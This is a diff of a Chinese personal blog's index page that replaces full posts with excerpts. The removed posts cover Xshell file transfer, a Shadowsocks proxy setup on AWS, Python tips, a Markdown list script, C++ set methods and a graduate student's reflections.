@@ -274,205 +274,6 @@
       
         
   <h2 class="title">
-    <a href="/archives/4555512d.html">
-      阶段学习心得
-    </a>
-  </h2>
-
-
-      
-      <div class='new-meta-box'>
-        
-          
-        
-          
-            
-  <div class='new-meta-item author'>
-    <a href="/https:/cxpeng.cn" rel="nofollow">
-      
-        <img src="https://i.loli.net/2019/05/17/5cde5331de4a260723.jpg">
-      
-      <p>Alex</p>
-    </a>
-  </div>
-
-
-          
-        
-          
-            <div class="new-meta-item date">
-  <a class='notlink'>
-    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-    <p>2019-05-13</p>
-  </a>
-</div>
-
-          
-        
-          
-            
-  
-  <div class='new-meta-item category'>
-    <a href='/categories/%E5%90%91%E5%BE%80%E7%9A%84%E7%94%9F%E6%B4%BB/' rel="nofollow">
-      <i class="fas fa-folder-open" aria-hidden="true"></i>
-      <p>向往的生活</p>
-    </a>
-  </div>
-
-
-          
-        
-          
-            
-
-          
-        
-          
-            
-
-          
-        
-      </div>
-      
-        <hr>
-      
-    </div>
-  </section>
-
-
-  <section class="article typo">
-    <div class="article-entry" itemprop="articleBody">
-      <p>1、无论什么语言：首先需要掌握好基本的使用知识，能够做到去实际只用代码工具之后，在详细的研究其内在原理，更容易掌握该语言。也就是说学习过程一般经历新手小白-熟练使用-熟练创造工具-大师级别<br />
-专精某种编程语言，掌握好解决问题的思路在进行扩展的学习，就招聘会的现场来看，Python语言远没有很大的需求，更多的是c/c++和Java。</p>
-
-      
-    </div>
-    
-  </section>
-</article>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <article class="post reveal ">
-  
-
-
-  <section class='meta'>
-    
-    
-    <div class="meta" id="header-meta">
-      
-        
-  <h2 class="title">
-    <a href="/archives/1b44cf9e.html">
-      Xshell连接远程主机
-    </a>
-  </h2>
-
-
-      
-      <div class='new-meta-box'>
-        
-          
-        
-          
-            
-  <div class='new-meta-item author'>
-    <a href="/https:/cxpeng.cn" rel="nofollow">
-      
-        <img src="https://i.loli.net/2019/05/17/5cde5331de4a260723.jpg">
-      
-      <p>Alex</p>
-    </a>
-  </div>
-
-
-          
-        
-          
-            <div class="new-meta-item date">
-  <a class='notlink'>
-    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-    <p>2019-05-10</p>
-  </a>
-</div>
-
-          
-        
-          
-            
-  
-  <div class='new-meta-item category'>
-    <a href='/categories/Linux/' rel="nofollow">
-      <i class="fas fa-folder-open" aria-hidden="true"></i>
-      <p>Linux</p>
-    </a>
-  </div>
-
-
-          
-        
-          
-            
-
-          
-        
-          
-            
-
-          
-        
-      </div>
-      
-        <hr>
-      
-    </div>
-  </section>
-
-
-  <section class="article typo">
-    <div class="article-entry" itemprop="articleBody">
-      <p>ssh被用来远程登录，是一种安全外壳协议，可以在不安全的网络中可以和远程通信。</p>
-<p>在Windows中Xshell 和 SecureCRT都是可以使用ssh协议来进行远程连接服务器的工具软件。在这里我使用的是Xshell6软件，首先要确保已经安装了软件，并且在本地有了服务器的公钥，前面的一篇文章已经提到了，怎么申请AWS服务器一年的使用，怎么样在本地连接服务器。这篇文章是考虑到实验室环境中为了安全防火，会在夜晚关掉电闸，所以想在服务器上跑代码，体毛需求。</p>
-<p>打开文件–打开–会话中属性–然后做下面的修改：<br />
-<img src="https://i.loli.net/2019/05/18/5cdfcba92396524284.jpg" alt="" /></p>
-<p>然后回到你的远程主机里面进行安装用lrzsz，一个可以用来上传和下载的小工具。</p>
-<pre><code>sudo apt-get install lrzsz
-</code></pre>
-<p>安装完成之后我们就可以在通过以下命令进行文件传输</p>
-<ul>
-<li>rz filename 将本地文件传到远程</li>
-<li>sz filename 将远程文件下载到本地</li>
-</ul>
-<p>1、注意以上是在远程主机里面进行的，这样理解上面的命令就简单了，rz就是receive 也就是接收本地上传的文件，sz也就是send将文件发送到本地。同时在Xshell支持输入命令rz回车会让你跳出窗口进行选择文件。</p>
-<p>2、注意要保存的文件必须拥有可以访问的权限，这时候就会用到chmod命令进行管理或者更换文件夹。</p>
-<p>当然进行文件传输的方式有多种，这里仅仅介绍了一种，可以正常使用。还有方法就是在github上建立远程仓库然后在本地和服务器上进行代码的同步。</p>
-
-      
-    </div>
-    
-  </section>
-</article>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <article class="post reveal ">
-  
-
-
-  <section class='meta'>
-    
-    
-    <div class="meta" id="header-meta">
-      
-        
-  <h2 class="title">
     <a href="/archives/bdb009c5.html">
       [科学上网]使用AWS搭梯子记录
     </a>
@@ -512,9 +313,9 @@
             
   
   <div class='new-meta-item category'>
-    <a href='/categories/%E5%AE%9E%E7%94%A8%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/' rel="nofollow">
+    <a href='/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/' rel="nofollow">
       <i class="fas fa-folder-open" aria-hidden="true"></i>
-      <p>实用工具汇总</p>
+      <p>技术经验</p>
     </a>
   </div>
 
@@ -541,65 +342,14 @@
 
   <section class="article typo">
     <div class="article-entry" itemprop="articleBody">
-      <p>感觉现在做什么事情都是奔着免费去的。</p>
-<p>这是一篇<code>免费</code>搭建梯子的实录：</p>
-<p>准备：</p>
-<ul>
-<li>进入AWS云官网，注册一个亚马逊账号。</li>
-<li>信用卡，需要绑定账号，否则无法使用云服务,刚开始会扣1刀，但是现在EC2可以免费使用一年。</li>
-<li>Xshell用来远程登录实例</li>
-<li><a href="https://github.com/shadowsocks/shadowsocks-windows/releases" target="_blank" rel="noopener">shadowsocks</a>:用作系统代理，在Windows中下载安装使用</li>
-</ul>
-<p>基本上是按照步骤介绍的工具准备,然后是按照下面的步骤进行</p>
-<ol>
-<li>注册账号，没什么可说的，简单</li>
-<li>右上角选择区域，选择东京或者新加坡</li>
-<li>右上角我的账户-控制台，找到左上角：服务-计算-EC2，点击进去，然后点击启动实例<br />
-<img src="00.bmp" alt="" /></li>
-<li>选择AMI<br />
-<img src="01.bmp" alt="" /></li>
-<li>选择实例类型<br />
-<img src="02.bmp" alt="" /></li>
-<li>配置实例，下一步</li>
-<li>添加存储<br />
-<img src="03.bmp" alt="" /></li>
-<li>添加标签，下一步</li>
-<li>配置安全组<br />
-<img src="04.bmp" alt="" /></li>
-<li>下一步进行审核审核，选择生成密钥对，下载，用来在Xshell远程连接。</li>
-</ol>
-<p>这样就生成了一个实例：</p>
-<p><img src="05.bmp" alt="" /></p>
-<p>下面通过Xshell远程登录：<br />
-步骤如下：</p>
-<p><img src="06.bmp" alt="" /><br />
-<img src="07.png" alt="" /></p>
-<p>在实例中安装shadowsocks服务端</p>
-<ul>
-<li>
-<p>安装pip</p>
-<pre><code>  sudo apt update
-  sudo apt-get install python-pip
-</code></pre>
-</li>
-<li>
-<p>利用pip安装shadowsocks</p>
-<pre><code>  sudo pip install shadowsocks
-</code></pre>
-</li>
-<li>
-<p>开启服务</p>
-<pre><code>  sudo ssserver -p port -k password -m aes-256-cfb -d start #这里的port和password都是自己指定
-</code></pre>
-</li>
-</ul>
-<p>下载shadowsocks客户端进行如下配置：<br />
-<img src="08.bmp" alt="" /><br />
-<img src="09.bmp" alt="" /></p>
-<p>最后一步，就是进入<a href="https://www.google.com/" target="_blank" rel="noopener">Google</a></p>
-<p>Enjoy it！</p>
-<p><img src="10.png" alt="" /></p>
-
+      免费试用aws，免费！
+      
+        <div class="readmore">
+          <a href="/archives/bdb009c5.html" class="flat-box">
+            <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
+            阅读全文
+          </a>
+        </div>
       
     </div>
     
@@ -671,9 +421,9 @@
             
   
   <div class='new-meta-item category'>
-    <a href='/categories/Python/' rel="nofollow">
+    <a href='/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/' rel="nofollow">
       <i class="fas fa-folder-open" aria-hidden="true"></i>
-      <p>Python</p>
+      <p>技术经验</p>
     </a>
   </div>
 
@@ -700,18 +450,14 @@
 
   <section class="article typo">
     <div class="article-entry" itemprop="articleBody">
-      <p>2008年，Python 3.0发布标志着Python语言打破了后向兼容，开始进化。</p>
-<ol>
-<li>print–&gt;print()：<br />
-将一条语句变为一个内置函数</li>
-<li>默认情况下字符串变为Unicode编码</li>
-<li>增加单例类型</li>
-<li>更新异常：增加了as关键字，使得语句更加简洁</li>
-<li>整数更新：long整型在Python3中消失，多有的数表现为long类型；除法更新python3中’/'永远返回浮点数。</li>
-<li>迭代无处不在：Python3中使用迭代器可以有效保护内存。如map() filter() range() zip() keys() values() items()</li>
-<li>生成器：在python3.x中生成器的next()方法变为__next__()方法</li>
-</ol>
-
+      常常会被问到你是用Python2还是Python3啊，有什么不同？
+      
+        <div class="readmore">
+          <a href="/archives/ac4af3ca.html" class="flat-box">
+            <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
+            阅读全文
+          </a>
+        </div>
       
     </div>
     
@@ -779,9 +525,9 @@
             
   
   <div class='new-meta-item category'>
-    <a href='/categories/Python/' rel="nofollow">
+    <a href='/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/' rel="nofollow">
       <i class="fas fa-folder-open" aria-hidden="true"></i>
-      <p>Python</p>
+      <p>技术经验</p>
     </a>
   </div>
 
@@ -808,10 +554,7 @@
 
   <section class="article typo">
     <div class="article-entry" itemprop="articleBody">
-      <h1 id="关于模块"><a class="markdownIt-Anchor" href="#关于模块"></a> 关于模块：</h1>
-<p><a href="https://docs.python.org/3.8/py-modindex.html" target="_blank" rel="noopener">Python模块索引大全</a></p>
-<p>随着程序的不断变大，需要将程序分为很多文件，创建成模块，一个.py文件就是一个模块。</p>
-<p>从目录中来导入模块，相应的目录称之为包package。使用import语句创建了一个命名空间，并在该命名空间中执行与.py相关的所有语句，要在导入后访问命名空间的内容，只要使用模块的名称当做前缀，就可以访问模块中的内容。</p>
+      使用模块和生成相关模块，可以大大提高开发效率。
       
         <div class="readmore">
           <a href="/archives/fe2495d8.html" class="flat-box">
@@ -888,9 +631,9 @@
             
   
   <div class='new-meta-item category'>
-    <a href='/categories/Python/' rel="nofollow">
+    <a href='/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/' rel="nofollow">
       <i class="fas fa-folder-open" aria-hidden="true"></i>
-      <p>Python</p>
+      <p>技术经验</p>
     </a>
   </div>
 
@@ -917,73 +660,14 @@
 
   <section class="article typo">
     <div class="article-entry" itemprop="articleBody">
-      <p>怎么样使用Python才会显得高大上呢！，用Python来解决一些问题相当简单，有了思路就可以动手去做了，但是既然知道了Python的特性，就要在coding中注意代码的质量和简洁性。</p>
-<p>一、首先，Python含有很多类库、可扩展库，还有很多开源项目，但是不能忽略其中的内置函数库，下面通过演示使用内置函数，提高编写代码的质量的简洁性。</p>
-<ol>
-<li>
-<p>内置函数enumerate来代替range()进行迭代。enumerate可以返回每个元素的索引和值。</p>
-<p>enumerate(list, start=num)# 可以通过设置start来设置其实偏移量</p>
-</li>
-<li>
-<p>列表推导式比map和filter函数表达更加清晰</p>
-<p>列表推导式更容易使得代码变得可读。</p>
-</li>
-<li>
-<p>使用breakpoint来进行调试而不是print</p>
-<p>事实情况就是在编码过程中使用print很不美观并且导致代码很乱</p>
-</li>
-<li>
-<p>使用f-string来格式化字符串</p>
-<p>f-string支持使用字符串格式化迷你语言和字符串插值</p>
-<p>name, age = cook, 12</p>
-<p>return f’my name is {name} and i`m {age/10.5f} decades old.’</p>
-</li>
-<li>
-<p>使用sorted()对复杂列表进行排序</p>
-<p>sorted()#设置reverse可以进行降序排序，设置key可以设置以什么字段排序</p>
-</li>
-</ol>
-<p>二、以后其次进行算法面试过程中，数据结构是考察的重点，在编码过程中要注意选择合适的数据结构来实现思路。</p>
-<ol>
-<li>
-<p>使用set存储唯一值</p>
-<p>可以在数据集中删除重复的值</p>
-</li>
-<li>
-<p>利用生成器来生成大量序列，这样更省内存。在读取大量数据到内存中进行计算中有明显优势。</p>
-</li>
-<li>
-<p>使用字典的get(key, default)方法，它的作用就是检查key是否在字典中，在的话返回key的value不在的话返回默认。</p>
-<p>但是如果想用默认值来更新key中的value 呢，则需要使用字典的setdefault(key, default)方法.即查找key是否在dict中，如果存在返回value，如果不存在使用default值更新字典。</p>
-</li>
-</ol>
-<p>三、学会使用标准库将会事半功倍</p>
-<ol>
-<li>
-<p>使用collections.defaultdict处理缺少的字典键，</p>
-<p>from import defaultdict<br />
-new_dict = defaultdict(list)#使用无参数的list作为默认值，当名字不存在时返回一个空列表[]</p>
-<p>这一部分不太明白找时间看源码</p>
-</li>
-<li>
-<p>collections.Counter来计算Hashable对象</p>
-<p>Couter是dict的子类，使用0作为任何缺失元素的默认值，并且更容易计算对象的出现次数。<br />
-将单词传入给Counter时，会存储每个单词和单词在列表中出现的次数。<br />
-调用most_common可以返回最多出现的单词</p>
-</li>
-<li>
-<p>使用字符串常量访问公共字符串组</p>
-</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">string.ascii_uppercase<span class="comment"># "ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span></pre></td></tr></table></figure>
-<ol start="4">
-<li>
-<p>使用Itertools生成排列和组合</p>
-<p>itertools.permutations()#生成所有可能，顺序有效<br />
-itertools.combinations()#去掉重复可能，无关顺序</p>
-</li>
-</ol>
-
+      微信公众号中经常发一些Python实现的小工具，在这里汇总记录下。
+      
+        <div class="readmore">
+          <a href="/archives/55a385d1.html" class="flat-box">
+            <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
+            阅读全文
+          </a>
+        </div>
       
     </div>
     
@@ -1051,9 +735,9 @@ itertools.combinations()#去掉重复可能，无关顺序</p>
             
   
   <div class='new-meta-item category'>
-    <a href='/categories/%E5%90%91%E5%BE%80%E7%9A%84%E7%94%9F%E6%B4%BB/' rel="nofollow">
+    <a href='/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/' rel="nofollow">
       <i class="fas fa-folder-open" aria-hidden="true"></i>
-      <p>向往的生活</p>
+      <p>生活随笔</p>
     </a>
   </div>
 
@@ -1080,22 +764,14 @@ itertools.combinations()#去掉重复可能，无关顺序</p>
 
   <section class="article typo">
     <div class="article-entry" itemprop="articleBody">
-      <blockquote>
-<p>悠悠天地，奈何独立苍茫！</p>
-</blockquote>
-<p>又一届师哥师姐毕业了，看着实验室只剩自己一个人关电闸，差点眼泪掉下来。自己一个人呆着就回忆起来这两年的读研经历。</p>
-<h1 id="刚"><a class="markdownIt-Anchor" href="#刚"></a> 刚</h1>
-<p>想起来并不是自己一个人在这里，实验室还有老鼠陪着我，要是说刚进实验室的时候，给我印象最深的也就是这帮老鼠了，一开门就是满桌子的老鼠屎，一桌拉完还有另外一桌，虽说没有什么味道，但还是挺恶心。更没想到的是，到最后排列杂乱的排泄物还是我最近清理掉的，前前后后经历了一年！门口路由器旁边坐的是一个胖胖的师哥，那时候他手里就有SCI在手，仍然奋斗在仿真一线，用他话说就是“没办法啊，老师还让我发一篇”，真是招人羡慕。之后所里的人都到齐了，不多不少三男一女，妥了！再然后就是一两个月的熟悉期，师哥给我们介绍了所里的环境和人际关系，更重要的是介绍了毕业答辩等一系列的事情，简直是读研手册，就这样几个人在这个破所里面，慢慢适应、交流，充满人情味。之后就是面临中期的开题，我开始出现了焦虑恐惧症，一是因为我真的没有思路，二是老师只问我我怎么想，那段时间整天就是查文献，翻译文献，定方案，写总结，最后一个方案没有出来，没办法去找老师交流，交流也是无功而返，还是那一句你怎么想，其实我的梦想就是老师你也给我几篇文献我去研究下，让我毕业就好！少年不知愁滋味，读了研才知道水这么深的，总之最后还是定了一个的方案，全程自己搞，最后答辩当然是哗啦啦。答辩甜蜜期过完，就进入论文准备阶段。</p>
-<h1 id="研"><a class="markdownIt-Anchor" href="#研"></a> 研</h1>
-<p>究生嘛，只要不是为了搞研究，其实就是在研究人际交流，到最后拿着毕业证，总有适合自己的发展天地。所以秉承不搞研究，只为工作的思想，开始新的选择，学习编程。话说软件开发哪有那么简单，以前只是被程序员这个概念完全的迷惑了，程序员的工作内容，我认为是具有创造性的工作，这在我学习过程中体现的淋漓尽致，简单调用一个函数，导入一个包谁都会，但是怎么有逻辑性的将各个模块整合起来，如果没有经过训练是难以完美实现的，就比如你心里想的是范冰冰，但是经过自己手可能搞出来一个特朗普，丫的！还带有一大堆错误，难看，难受！本科阶段短暂的学过C和C<ins>但是那点基础知识掌握的远远不够，和我女朋友聊起编程的内容，这个毕业两年的科班毕业生，奋斗在国企的保洁员工，掌握的知识都我全，和科班生是真的有差距，但是对于科班生相比，我们这些专业学过的基础学科确实他们没有经过的培训，所以我把目标定在了能够和他们进行竞争的数据分析和机器学习方向，经过了解现在AI火的一塌糊涂，Python也成了热门语言，我自然而然的成了Python语言的拥护者，学起来入门是真的简单，相比C</ins>来说，真是良心语言，具体的缺点我还没搞懂，但是就是简单好学，有想法可以借助Python库和开源代码实现。确定好目标之后陆陆续续学了Linux基础命令、Python基础、Python高级特性、数据分析、数据挖掘实战、西瓜书…今年开始找实习的时候才开始慌了，数据分析报录比40:1，难以想象的火爆，看来当初的分析还是有偏差，就比如今年我们学校考研报名人数超多，那么肯定有大部分人当了炮灰，啧啧啧！没跑了，我在填炮坑的路上！路漫漫其修远兮，吾将上下而求索。现在该怎么办呢！是改变方向还是继续选择走这条道路呢！</p>
-<p><img src="%E5%88%86%E5%8F%89%E8%B7%AF.jpg" alt="" /></p>
-<h1 id="明"><a class="markdownIt-Anchor" href="#明"></a> 明</h1>
-<p>天，老舅来上海出差，还是试着向老舅寻求帮助…</p>
-<h1 id="后"><a class="markdownIt-Anchor" href="#后"></a> 后</h1>
-<p>续来了呆了两天，分析后得到的结论是，胆大心细，擅于观察行业内的细节和动向。最重要的还是态度积极端正，未来可期！</p>
-<pre><code>                                          2019/4/27 星期六 下午 4:16:33
-</code></pre>
-
+      又一届师哥师姐毕业了，看着实验室只剩自己一个人关电闸，差点眼泪掉下来。自己一个人呆着就回忆起来这两年的读研经历。
+      
+        <div class="readmore">
+          <a href="/archives/c82868cc.html" class="flat-box">
+            <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
+            阅读全文
+          </a>
+        </div>
       
     </div>
     
@@ -1157,9 +833,9 @@ itertools.combinations()#去掉重复可能，无关顺序</p>
             
   
   <div class='new-meta-item category'>
-    <a href='/categories/Python/' rel="nofollow">
+    <a href='/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/' rel="nofollow">
       <i class="fas fa-folder-open" aria-hidden="true"></i>
-      <p>Python</p>
+      <p>技术经验</p>
     </a>
   </div>
 
@@ -1186,10 +862,14 @@ itertools.combinations()#去掉重复可能，无关顺序</p>
 
   <section class="article typo">
     <div class="article-entry" itemprop="articleBody">
-      <p>在整理命令列表的时候，使用MD的时候，发现没办法批量添加无序列表，所以用python实现了下.</p>
-<p>源代码：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"><span class="string">    方便以后编写Markdown文档时候批量生成无序列表</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"><span class="string">    将需要操作的内容保存到制定文件中，然后运行程序即可。</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#添加无序列表格式’- ‘</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geshiHua</span><span class="params">(file)</span>:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">    bk_file = create_bk(file)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">    file_list = []</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">with</span> open(bk_file, <span class="string">'r'</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">            file_list.append(line)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#    print(file_list)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">with</span> open(file, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file_list:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">            <span class="keyword">if</span> line == <span class="string">'\n'</span>:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">               f.write(line)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">            line = <span class="string">"- "</span> + line</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">            f.write(line)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">    auth = input(<span class="string">'是否删除原文件备份（y/n）：'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> auth == <span class="string">'y'</span>:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">        os.remove(bk_file)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">        print(<span class="string">'备份文件已删除！'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">else</span>:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">        <span class="keyword">pass</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">    print(file + <span class="string">':已经格式化完成'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建备份文件</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_bk</span><span class="params">(file)</span>:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">    bk_file = file + <span class="string">'.bk'</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">    os.rename(file, bk_file)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">return</span> bk_file</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#删除备份文件</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(file)</span>:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">    os.remove(file)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#主程序</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line">    file_path =  <span class="string">r'./add_style_md.md'</span><span class="comment">#用来保存待添加格式的文件</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#    print(file_path)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#    file_path ="\\" .join(file_path)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#   print(file_path)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">51</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">52</span></pre></td><td class="code"><pre><span class="line">    geshiHua(file_path)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">53</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">54</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">55</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">56</span></pre></td><td class="code"><pre><span class="line">    main()</span></pre></td></tr></table></figure>
-
+      在编写Markdown文档时候批量生成无序列表
+      
+        <div class="readmore">
+          <a href="/archives/b759e75d.html" class="flat-box">
+            <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
+            阅读全文
+          </a>
+        </div>
       
     </div>
     
@@ -1251,9 +931,9 @@ itertools.combinations()#去掉重复可能，无关顺序</p>
             
   
   <div class='new-meta-item category'>
-    <a href='/categories/C-C/' rel="nofollow">
+    <a href='/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/' rel="nofollow">
       <i class="fas fa-folder-open" aria-hidden="true"></i>
-      <p>C/C++</p>
+      <p>技术经验</p>
     </a>
   </div>
 
@@ -1280,84 +960,14 @@ itertools.combinations()#去掉重复可能，无关顺序</p>
 
   <section class="article typo">
     <div class="article-entry" itemprop="articleBody">
-      <ul>
-<li>
-<p>set的特点是：集合中的元素根据键值自动排序，没有重复元素</p>
-</li>
-<li>
-<p>声明：</p>
-<p>set &lt;类型&gt; 名称   如： set<int>s1;</p>
-</li>
-<li>
-<p>set中的函数</p>
-<ul>
-<li>
-<p>begin()返回指向第一个元素的迭代器</p>
-</li>
-<li>
-<p>end()返回指向最后一个元素的迭代器</p>
-</li>
-<li>
-<p>erase()–删除元素      只能根据元素的值删除元素，不能根据第几个元素进行删除</p>
-</li>
-<li>
-<p>insert()–插入元素</p>
-</li>
-<li>
-<p>clear()–清除所有元素</p>
-</li>
-</ul>
-</li>
-<li>
-<p>count()–返回某个值元素的个数</p>
-</li>
-<li>
-<p>empty()–如果集合为空，返回true equal_range()–返回集合中与给定值相等的上下限的两个迭代器</p>
-</li>
-<li>
-<p>find()–返回一个指向被查找到元素的迭代器</p>
-</li>
-<li>
-<p>get_allocator()–返回集合的分配器</p>
-</li>
-<li>
-<p>lower_bound()–返回指向大于（或等于）某值的第一个元素的迭代器</p>
-</li>
-<li>
-<p>key_comp()–返回一个用于元素间值比较的函数</p>
-</li>
-<li>
-<p>max_size()–返回集合能容纳的元素的最大限值</p>
-</li>
-<li>
-<p>rbegin()–返回指向集合中最后一个元素的反向迭代器</p>
-</li>
-<li>
-<p>rend()–返回指向集合中第一个元素的反向迭代器</p>
-</li>
-<li>
-<p>size()–集合中元素的数目</p>
-</li>
-<li>
-<p>swap()–交换两个集合变量</p>
-</li>
-<li>
-<p>upper_bound()–返回大于某个值元素的迭代器</p>
-</li>
-<li>
-<p>value_comp()–返回一个用于比较元素间的值的函数</p>
-</li>
-</ul>
-<p>关于迭代器：<br />
-声明：set&lt;类型&gt;::iterator 名称<br />
-set<int>::iterator it=s.begin();</p>
-<p>注**迭代器的类型要与定义的set类型相同<br />
